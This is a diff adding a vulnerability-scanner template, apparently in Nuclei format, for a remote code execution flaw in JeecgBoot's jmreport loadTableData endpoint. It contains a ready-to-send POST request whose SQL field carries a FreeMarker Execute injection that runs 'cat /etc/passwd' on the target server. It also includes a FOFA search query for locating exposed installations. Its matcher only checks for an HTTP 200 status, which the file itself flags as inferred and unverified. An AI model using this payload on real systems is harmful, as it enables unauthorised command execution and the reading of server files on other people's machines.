@@ -1,0 +1,34 @@
+id: poc-25af8054c4377badd92a
+info:
+  name: JeecgBoot企业级低代码平台loadTableData存在任意代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/25af8054c4377badd92a0fa28edade9f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 25af8054c4377badd92a0fa28edade9f
+    fofa: + fofa`app="JeecgBoot-企业级低代码平台"`
+http:
+- raw:
+  - 'POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+
+    Content-Type: application/json;charset=UTF-8
+
+    Connection: close
+
+    Content-Length: 161
+
+
+    {"dbSource":"","sql":"select ''<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"cat /etc/passwd\")}''","tableName":"test_demo);","pageNo":1,"pageSize":10}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
